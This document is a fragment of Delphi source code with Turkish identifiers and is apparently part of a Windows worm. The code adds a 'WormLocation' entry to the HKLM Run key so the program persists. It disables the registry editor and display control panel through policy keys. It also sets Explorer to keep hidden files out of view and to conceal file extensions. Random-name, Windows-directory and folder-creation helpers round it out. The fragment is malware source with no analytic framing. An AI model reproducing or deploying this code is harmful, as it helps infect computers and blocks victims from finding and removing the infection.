   function StrEnd(const Str: PChar): PChar; assembler;
   asm
           MOV     EDX,EDI
           MOV     EDI,EAX
           MOV     ECX,0FFFFFFFFH
           XOR     AL,AL
           REPNE   SCASB
           LEA     EAX,[EDI-1]
           MOV     EDI,EDX
   end;
   Function RandomStr(i: integer): String;
   Var
   k,Tmp: Integer;
   Harf,Str: String;
   Begin
   str:='';
   Harf:='qwertyuopasdfghjklizxcvbnm';
   For k:=1 To i Do
   Begin
    Tmp:=Random(Length(Harf));
    If Tmp = 0 Then Tmp:=1;
    Str:=Str+Harf[Tmp];
   End;
   Result:=Str;
   End;
   Function Windizin:String;
   Var
   Windir:Pchar;
   Begin
    Getmem(Windir,100);
    GetWindowsDirectory(Windir,100);
    Result:=Windir+'\';
    Freemem(Windir);
   End;

   Function AutoStart(WormLocation,RegAdi:String):String;
   Begin
   RegOpenKeyEx(HKEY_LOCAL_MACHINE,'Software\Microsoft\Windows\CurrentVersion\Run',1,KEY_ALL_ACCESS,HndKey);
   RegSetValueEx(hndKey,Pchar(RegAdi),0,REG_SZ,Pchar(WormLocation),Length(WormLocation));
   RegCloseKey(hndKey);
   End;

   Procedure KayitAyarlari(Value:Boolean);
   Begin
   RegOpenKeyEx(HKEY_CURRENT_USER,
    'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
    1,KEY_ALL_ACCESS,HndKey);
   Deger:=Ord(Value);
   BufSize:=SizeOf(Deger);Buffer:=@Deger;
   RegSetValueEx(hndKey,'DisableRegistryTools',0,REG_DWORD,@Deger,BufSize);
   RegSetValueEx(hndKey,'NoDispCPL',0,REG_DWORD,@Deger,BufSize);
   RegCloseKey(hndKey);

   RegOpenKeyEx(HKEY_CURRENT_USER,
   'Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced',
   1,KEY_ALL_ACCESS,HndKey);
   Deger:=ord(2);
   BufSize:=SizeOf(Deger);
   RegSetValueEx(hndKey,'Hidden',0,REG_DWORD,@Deger,BufSize);
   Deger:=ord(1);
   BufSize:=SizeOf(Deger);
   RegSetValueEx(hndKey,'HideFileExt',0,REG_DWORD,@Deger,BufSize);
   RegCloseKey(HndKey);
   End;
   function ExtractFilePath(FileName: string): string;
   var
     i: Integer;
   begin
   For i:=Length(FileName) DownTo 1 Do
   If FileName[i]='\' Then Break;
   Result:=Copy(FileName, 1, i);
   end;
   Function KlasorYap(Klasor:String):Boolean;
   Var
   AltKlasor,Alt1:String;
   Begin
   If Not DirectoryExists(Klasor) Then
   Begin
    Alt1:=Klasor;
    If Alt1[Length(Alt1)]='\' Then Delete(Alt1,Length(Alt1),1);
    AltKlasor:=ExtractFilePath(Alt1);
    If DirectoryExists(AltKlasor) Then CreateDirectory(PChar(Klasor), nil) Else
    Begin
    If KlasorYap(AltKlasor)=True Then
    Begin
    If DirectoryExists(AltKlasor) Then CreateDirectory(PChar(Klasor), nil);
    End;
    End;
    If DirectoryExists(Klasor) Then Result:=True Else Result:=False;
   End Else
   Result:=True;
   End;
